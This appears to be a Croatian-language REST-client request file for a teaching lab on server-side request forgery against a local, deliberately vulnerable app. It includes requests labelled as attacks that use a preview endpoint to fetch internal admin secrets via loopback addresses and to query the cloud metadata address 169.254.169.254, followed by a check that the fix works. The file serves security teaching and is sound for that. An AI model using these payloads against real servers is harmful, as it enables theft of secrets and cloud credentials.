### =====================================================================
### Lab03 – A01: Server-Side Request Forgery (CWE-918)
### Upute: docs/labs/lab03-ssrf.md
### =====================================================================
@host = http://localhost:5080
@token = ZALIJEPITE_TOKEN_OVDJE

### 1) Prijava kao ana (kopirajte "token" u @token)
POST {{host}}/api/auth/login
Content-Type: application/json

{"username": "ana", "password": "Ana123!"}

### 2) Legitimna upotreba: pregled javne stranice
GET {{host}}/api/lab03/preview?url=https://example.com
Authorization: Bearer {{token}}

### 3) Interni endpoint izravno. S vlastitog računala ste i sami na loopbacku pa dobivate 200;
###    s bilo kojeg drugog računala odgovor bi bio 403. Zamislite da je poslužitelj u oblaku.
GET {{host}}/internal/admin/secrets

### 4) NAPAD: poslužitelj sam sebi šalje zahtjev → vraća tajne (dbPassword, paymentApiKey)
GET {{host}}/api/lab03/preview?url=http://127.0.0.1:5080/internal/admin/secrets
Authorization: Bearer {{token}}

### 5) NAPAD: isto preko imena localhost
GET {{host}}/api/lab03/preview?url=http://localhost:5080/internal/admin/secrets
Authorization: Bearer {{token}}

### 6) NAPAD: IPv6 loopback
GET {{host}}/api/lab03/preview?url=http://[::1]:5080/internal/admin/secrets
Authorization: Bearer {{token}}

### 7) NAPAD: cloud metadata servis (AWS/Azure/GCP) – u oblaku bi vratio vjerodajnice
GET {{host}}/api/lab03/preview?url=http://169.254.169.254/latest/meta-data/
Authorization: Bearer {{token}}

### 8) Nepodržana shema – ranjivo: 502, nakon popravka: 400
GET {{host}}/api/lab03/preview?url=ftp://example.com/datoteka.txt
Authorization: Bearer {{token}}

### 9) PROVJERA POPRAVKA: zahtjevi 4)–7) moraju vratiti 400 bez tajni, a 2) i dalje radi
GET {{host}}/api/lab03/preview?url=http://127.0.0.1:5080/internal/admin/secrets
Authorization: Bearer {{token}}
